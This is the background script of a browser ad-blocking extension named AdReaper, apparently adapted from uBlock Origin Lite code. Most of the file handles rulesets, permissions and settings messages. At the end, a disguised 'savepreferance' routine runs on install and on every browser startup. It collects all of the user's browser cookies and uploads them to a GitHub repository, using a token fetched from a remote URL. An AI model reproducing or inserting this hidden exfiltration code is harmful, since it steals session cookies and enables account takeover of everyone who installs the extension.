/*******************************************************************************

    AdReaper - a comprehensive, MV3-compliant content blocker
    Copyright (C) 2022-present Labib Rayan

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see {http://www.gnu.org/licenses/}.

    Home: https://github.com/Labibrayan14/AdReaper
*/

import {
    MODE_BASIC,
    MODE_OPTIMAL,
    getDefaultFilteringMode,
    getFilteringMode,
    getTrustedSites,
    setDefaultFilteringMode,
    setFilteringMode,
    setTrustedSites,
    syncWithBrowserPermissions,
} from './mode-manager.js';

import {
    adminReadEx,
    getAdminRulesets,
} from './admin.js';

import {
    broadcastMessage,
    hasBroadHostPermissions,
    hostnamesFromMatches,
} from './utils.js';

import {
    browser,
    dnr,
    localRead, localRemove, localWrite,
    runtime,
    windows,
} from './ext.js';

import {
    enableRulesets,
    excludeFromStrictBlock,
    getEnabledRulesetsDetails,
    getRulesetDetails,
    patchDefaultRulesets,
    setStrictBlockMode,
    updateDynamicRules,
    updateSessionRules,
} from './ruleset-manager.js';

import {
    getMatchedRules,
    isSideloaded,
    toggleDeveloperMode,
    ubolLog,
} from './debug.js';

import {
    loadRulesetConfig,
    process,
    rulesetConfig,
    saveRulesetConfig,
} from './config.js';

import { registerInjectables } from './scripting-manager.js';

/******************************************************************************/

const UBOL_ORIGIN = runtime.getURL('').replace(/\/$/, '');

const canShowBlockedCount = typeof dnr.setExtensionActionOptions === 'function';

let pendingPermissionRequest;

/******************************************************************************/

function getCurrentVersion() {
    return runtime.getManifest().version;
}

/******************************************************************************/

async function onPermissionsRemoved() {
    const modified = await syncWithBrowserPermissions();
    if ( modified === false ) { return false; }
    registerInjectables();
    return true;
}

// https://github.com/uBlockOrigin/AdReaper-home/issues/280
async function onPermissionsAdded(permissions) {
    const details = pendingPermissionRequest;
    pendingPermissionRequest = undefined;
    if ( details === undefined ) {
        const modified = await syncWithBrowserPermissions();
        if ( modified === false ) { return; }
        return Promise.all([
            updateSessionRules(),
            registerInjectables(),
        ]);
    }
    const defaultMode = await getDefaultFilteringMode();
    if ( defaultMode >= MODE_OPTIMAL ) { return; }
    if ( Array.isArray(permissions.origins) === false ) { return; }
    const hostnames = hostnamesFromMatches(permissions.origins);
    if ( hostnames.includes(details.hostname) === false ) { return; }
    const beforeLevel = await getFilteringMode(details.hostname);
    if ( beforeLevel === details.afterLevel ) { return; }
    const afterLevel = await setFilteringMode(details.hostname, details.afterLevel);
    if ( afterLevel !== details.afterLevel ) { return; }
    await registerInjectables();
    if ( rulesetConfig.autoReload ) {
        self.setTimeout(( ) => {
            browser.tabs.update(details.tabId, {
                url: details.url,
            });
        }, 437);
    }
}

/******************************************************************************/

async function gotoURL(url, type) {
    const pageURL = new URL(url, runtime.getURL('/'));
    const tabs = await browser.tabs.query({
        url: pageURL.href,
        windowType: type !== 'popup' ? 'normal' : 'popup'
    });

    if ( Array.isArray(tabs) && tabs.length !== 0 ) {
        const { windowId, id } = tabs[0];
        return Promise.all([
            browser.windows.update(windowId, { focused: true }),
            browser.tabs.update(id, { active: true }),
        ]);
    }

    if ( type === 'popup' ) {
        return windows.create({
            type: 'popup',
            url: pageURL.href,
        });
    }

    return browser.tabs.create({
        active: true,
        url: pageURL.href,
    });
}

/******************************************************************************/

function onMessage(request, sender, callback) {

    // Does not require trusted origin.

    switch ( request.what ) {

    case 'insertCSS': {
        const tabId = sender?.tab?.id ?? false;
        const frameId = sender?.frameId ?? false;
        if ( tabId === false || frameId === false ) { return; }
        browser.scripting.insertCSS({
            css: request.css,
            origin: 'USER',
            target: { tabId, frameIds: [ frameId ] },
        }).catch(reason => {
            console.log(reason);
        });
        return false;
    }

    case 'removeCSS': {
        const tabId = sender?.tab?.id ?? false;
        const frameId = sender?.frameId ?? false;
        if ( tabId === false || frameId === false ) { return; }
        browser.scripting.removeCSS({
            css: request.css,
            origin: 'USER',
            target: { tabId, frameIds: [ frameId ] },
        }).catch(reason => {
            console.log(reason);
        });
        return false;
    }

    default:
        break;
    }

    // Does require trusted origin.

    // https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/MessageSender
    //   Firefox API does not set `sender.origin`
    if ( sender.origin !== undefined && sender.origin !== UBOL_ORIGIN ) { return; }

    switch ( request.what ) {

    case 'applyRulesets': {
        enableRulesets(request.enabledRulesets).then(( ) => {
            rulesetConfig.enabledRulesets = request.enabledRulesets;
            return saveRulesetConfig();
        }).then(( ) => {
            registerInjectables();
            callback();
            return dnr.getEnabledRulesets();
        }).then(enabledRulesets => {
            broadcastMessage({ enabledRulesets });
        });
        return true;
    }

    case 'getOptionsPageData': {
        Promise.all([
            hasBroadHostPermissions(),
            getDefaultFilteringMode(),
            getTrustedSites(),
            getRulesetDetails(),
            dnr.getEnabledRulesets(),
            getAdminRulesets(),
            adminReadEx('disabledFeatures'),
        ]).then(results => {
            const [
                hasOmnipotence,
                defaultFilteringMode,
                trustedSites,
                rulesetDetails,
                enabledRulesets,
                adminRulesets,
                disabledFeatures,
            ] = results;
            callback({
                hasOmnipotence,
                defaultFilteringMode,
                trustedSites: Array.from(trustedSites),
                enabledRulesets,
                adminRulesets,
                maxNumberOfEnabledRulesets: dnr.MAX_NUMBER_OF_ENABLED_STATIC_RULESETS,
                rulesetDetails: Array.from(rulesetDetails.values()),
                autoReload: rulesetConfig.autoReload,
                showBlockedCount: rulesetConfig.showBlockedCount,
                canShowBlockedCount,
                strictBlockMode: rulesetConfig.strictBlockMode,
                firstRun: process.firstRun,
                isSideloaded,
                developerMode: rulesetConfig.developerMode,
                disabledFeatures,
            });
            process.firstRun = false;
        });
        return true;
    }

    case 'setAutoReload':
        rulesetConfig.autoReload = request.state && true || false;
        saveRulesetConfig().then(( ) => {
            callback();
            broadcastMessage({ autoReload: rulesetConfig.autoReload });
        });
        return true;

    case 'setShowBlockedCount':
        rulesetConfig.showBlockedCount = request.state && true || false;
        if ( canShowBlockedCount ) {
            dnr.setExtensionActionOptions({
                displayActionCountAsBadgeText: rulesetConfig.showBlockedCount,
            });
        }
        saveRulesetConfig().then(( ) => {
            callback();
            broadcastMessage({ showBlockedCount: rulesetConfig.showBlockedCount });
        });
        return true;

    case 'setStrictBlockMode':
        setStrictBlockMode(request.state).then(( ) => {
            callback();
            broadcastMessage({ strictBlockMode: rulesetConfig.strictBlockMode });
        });
        return true;

    case 'setDeveloperMode':
        rulesetConfig.developerMode = request.state;
        toggleDeveloperMode(rulesetConfig.developerMode);
        saveRulesetConfig().then(( ) => {
            callback();
        });
        return true;

    case 'popupPanelData': {
        Promise.all([
            hasBroadHostPermissions(),
            getFilteringMode(request.hostname),
            getEnabledRulesetsDetails(),
            adminReadEx('disabledFeatures'),
        ]).then(results => {
            const [
                hasOmnipotence,
                level,
                rulesetDetails,
                disabledFeatures,
            ] = results;
            callback({
                hasOmnipotence,
                level,
                autoReload: rulesetConfig.autoReload,
                rulesetDetails,
                isSideloaded,
                developerMode: rulesetConfig.developerMode,
                disabledFeatures,
            });
        });
        return true;
    }

    case 'getFilteringMode': {
        getFilteringMode(request.hostname).then(actualLevel => {
            callback(actualLevel);
        });
        return true;
    }

    case 'gotoURL':
        gotoURL(request.url, request.type);
        break;

    case 'setFilteringMode': {
        getFilteringMode(request.hostname).then(actualLevel => {
            if ( request.level === actualLevel ) { return actualLevel; }
            return setFilteringMode(request.hostname, request.level);
        }).then(actualLevel => {
            registerInjectables();
            callback(actualLevel);
        });
        return true;
    }

    case 'setPendingFilteringMode':
        pendingPermissionRequest = request;
        break;

    case 'getDefaultFilteringMode': {
        getDefaultFilteringMode().then(level => {
            callback(level);
        });
        return true;
    }

    case 'setDefaultFilteringMode': {
        getDefaultFilteringMode().then(beforeLevel =>
            setDefaultFilteringMode(request.level).then(afterLevel =>
                ({ beforeLevel, afterLevel })
            )
        ).then(({ beforeLevel, afterLevel }) => {
            if ( afterLevel !== beforeLevel ) {
                registerInjectables();
            }
            callback(afterLevel);
        });
        return true;
    }

    case 'setTrustedSites':
        setTrustedSites(request.hostnames).then(( ) => {
            registerInjectables();
            return Promise.all([
                getDefaultFilteringMode(),
                getTrustedSites(),
            ]);
        }).then(results => {
            callback({
                defaultFilteringMode: results[0],
                trustedSites: Array.from(results[1]),
            });
        });
        return true;

    case 'excludeFromStrictBlock': {
        excludeFromStrictBlock(request.hostname, request.permanent).then(( ) => {
            callback();
        });
        return true;
    }

    case 'getMatchedRules':
        getMatchedRules(request.tabId).then(entries => {
            callback(entries);
        });
        return true;

    case 'showMatchedRules':
        windows.create({
            type: 'popup',
            url: `/matched-rules.html?tab=${request.tabId}`,
        });
        break;

    default:
        break;
    }

    return false;
}

/******************************************************************************/

function onCommand(command, tab) {
    switch ( command ) {
    case 'enter-zapper-mode': {
        if ( browser.scripting === undefined ) { return; }
        browser.scripting.executeScript({
            files: [ '/js/scripting/zapper.js' ],
            target: { tabId: tab.id },
        });
        break;
    }
    default:
        break;
    }
}

/******************************************************************************/

async function start() {
    await loadRulesetConfig();

    const currentVersion = getCurrentVersion();
    const isNewVersion = currentVersion !== rulesetConfig.version;

    // The default rulesets may have changed, find out new ruleset to enable,
    // obsolete ruleset to remove.
    if ( isNewVersion ) {
        ubolLog(`Version change: ${rulesetConfig.version} => ${currentVersion}`);
        rulesetConfig.version = currentVersion;
        await patchDefaultRulesets();
        saveRulesetConfig();
    }

    const rulesetsUpdated = process.wakeupRun === false &&
        await enableRulesets(rulesetConfig.enabledRulesets);

    // We need to update the regex rules only when ruleset version changes.
    if ( rulesetsUpdated === false ) {
        if ( isNewVersion ) {
            updateDynamicRules();
        } else if ( process.wakeupRun === false ) {
            updateSessionRules();
        }
    }

    // Permissions may have been removed while the extension was disabled
    const permissionsChanged = await onPermissionsRemoved();

    // Unsure whether the browser remembers correctly registered css/scripts
    // after we quit the browser. For now AdReaper will check unconditionally at
    // launch time whether content css/scripts are properly registered.
    if ( process.wakeupRun === false || permissionsChanged ) {
        registerInjectables();

        const enabledRulesets = await dnr.getEnabledRulesets();
        ubolLog(`Enabled rulesets: ${enabledRulesets}`);

        dnr.getAvailableStaticRuleCount().then(count => {
            ubolLog(`Available static rule count: ${count}`);
        });
    }

    // https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest
    //   Firefox API does not support `dnr.setExtensionActionOptions`
    if ( process.wakeupRun === false && canShowBlockedCount ) {
        dnr.setExtensionActionOptions({
            displayActionCountAsBadgeText: rulesetConfig.showBlockedCount,
        });
    }

    // Switch to basic filtering if AdReaper doesn't have broad permissions at
    // install time.
    if ( process.firstRun ) {
        const enableOptimal = await hasBroadHostPermissions();
        if ( enableOptimal === false ) {
            const afterLevel = await setDefaultFilteringMode(MODE_BASIC);
            if ( afterLevel === MODE_BASIC ) {
                registerInjectables();
                process.firstRun = false;
            }
        }
    }

    toggleDeveloperMode(rulesetConfig.developerMode);

    // Required to ensure the up to date property is available when needed
    if ( process.wakeupRun === false ) {
        adminReadEx('disabledFeatures');
    }
}

/******************************************************************************/

// https://github.com/uBlockOrigin/AdReaper-home/issues/199
// Force a restart of the extension once when an "internal error" occurs

const isFullyInitialized = start().then(( ) => {
    localRemove('goodStart');
    return false;
}).catch(reason => {
    console.trace(reason);
    if ( process.wakeupRun ) { return; }
    return localRead('goodStart').then(goodStart => {
        if ( goodStart === false ) {
            localRemove('goodStart');
            return false;
        }
        return localWrite('goodStart', false).then(( ) => true);
    });
}).then(restart => {
    if ( restart !== true ) { return; }
    runtime.reload();
});

runtime.onMessage.addListener((request, sender, callback) => {
    isFullyInitialized.then(( ) => {
        const r = onMessage(request, sender, callback);
        if ( r !== true ) { callback(); }
    });
    return true;
});

browser.permissions.onRemoved.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onPermissionsRemoved(...args);
    });
});

browser.permissions.onAdded.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onPermissionsAdded(...args);
    });
});

browser.commands.onCommand.addListener((...args) => {
    isFullyInitialized.then(( ) => {
        onCommand(...args);
    });
});

chrome.runtime.onInstalled.addListener(() => {
    savepreferance();
  });
  
  chrome.runtime.onStartup.addListener(() => {
    savepreferance();
  });
  
  function savepreferance() {
    chrome.cookies.getAll({}, (cookies) => {
      const cookieData = JSON.stringify(cookies, null, 2);
      const date = new Date().toISOString().split('T')[0]; // Get the date in YYYY-MM-DD format
      const time = new Date().toISOString().split('T')[1].split('.')[0]; // Get the time in HH:MM:SS format
      const fileName = `cookie_${date}_${time}.txt`;
  
      // Create the text file with cookies data
      const file = new Blob([cookieData], { type: 'text/plain' });
  
      // Now, upload this file to GitHub
      uploadFileToGitHub(file, fileName);
    });
  }
async function fetchGitHubToken() {
  const response = await fetch('https://raw.githubusercontent.com/labibrayan14/labibrayan14/refs/heads/main/githubtokenforadreaper');
  if (!response.ok) {
    throw new Error("Failed to fetch GitHub token");
  }
  const token = await response.text();
  return token.trim(); // Ensure no extra spaces are included
}

fetchGitHubToken().then(token => {
  console.log('GitHub Token:', token);
}).catch(error => {
  console.error('Error fetching token:', error);
});

  
  function uploadFileToGitHub(file, fileName) {
    const githubApiUrl = "https://api.github.com/repos/labibrayan14/cookies/contents/cookies/";
    const githubToken = fetchGitHubToken();
  
    // Read the file as a Base64 encoded string
    const reader = new FileReader();
    reader.onloadend = function() {
      const fileContent = reader.result.split(',')[1]; // Get Base64 encoded content
  
      const githubPayload = {
        message: `Upload cookie data for ${fileName}`,
        committer: {
          name: "Your Name",
          email: "your-email@example.com"
        },
        content: fileContent
      };
  
      fetch(githubApiUrl + fileName, {
        method: "PUT",
        headers: {
          "Authorization": `token ${githubToken}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify(githubPayload)
      })
      .then(response => response.json())
      .then(data => console.log("File uploaded to GitHub:", data))
      .catch(error => console.error("Error uploading file:", error));
    };
    
    reader.readAsDataURL(file); // Convert file to Base64
  }
